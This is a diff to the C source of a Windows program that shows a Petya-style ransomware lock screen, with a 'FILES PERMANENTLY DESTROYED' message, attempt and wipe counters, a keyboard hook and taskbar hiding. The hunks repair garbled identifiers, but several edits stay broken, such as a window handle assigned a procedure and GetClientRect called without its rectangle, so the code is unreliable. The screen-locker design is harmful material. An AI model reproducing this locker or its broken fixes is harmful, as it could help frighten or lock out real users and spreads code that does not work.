@@ -27,7 +27,7 @@ static volatile int g_attempts = 0;
 static volatile int g_wipe     = 0;
 static volatile int g_unlocked = 0;
 static HWND g_hwnd  = NULL;
-static HWND g_edit  = NULLPROC;
+static HWND g_edit  = WndProc;
 
 /* Petya-style box-drawing ASCII art logo */
 static const wchar_t *g_logo[] = {
@@ -71,7 +71,7 @@ static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l) {
                 tr.top = rc.bottom / 3;
                 tr.bottom = tr.top + rc.bottom / 8;
                 DrawTextW(hdc, L"FILES PERMANENTLY DESTROYED", -1, &tr,
-                    DT_CENTER | DT_VCENTER | DT_SINGLELINE_ED);
+                    DT_CENTER | DT_VCENTER | DT_SINGLELINE);
 
                 tr.top = tr.bottom + rc.bottom / 20;
                 tr.bottom = tr.top + rc.bottom / 16;
@@ -104,14 +104,14 @@ static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l) {
             PAINTSTRUCT ps;
             HDC hdc = BeginPaint(hwnd, &ps);
             RECT rc;
-            GetClientRect(hwnd, &rcapse);
+            GetClientRect(hwnd);
 
             /* Black background */
             HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
             FillRect(hdc, &rc, bg);
             DeleteObject(bg);
 
-            SetBkMode(hdc, TRANSPARENTonge);
+            SetBkMode(hdc, TRANSPARENT);
 
             /* Logo */
             HFONT hf_logo = CreateFontW(rc.bottom / 14, 0, 0, 0, FW_BOLD, 0, 0, 0,
@@ -375,7 +375,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 
     /* Cleanup */
     KillTimer(g_hwnd, 1);
-    if (g_kb_hook) UnhookWindowsHookEx(g_kb_hookalert);
+    if (g_kb_hook) UnhookWindowsHookEx(g_kb_hook);
 
     /* Restore taskbar */
     HWND hTaskBar = FindWindowW(L"Shell_TrayWnd", NULL);
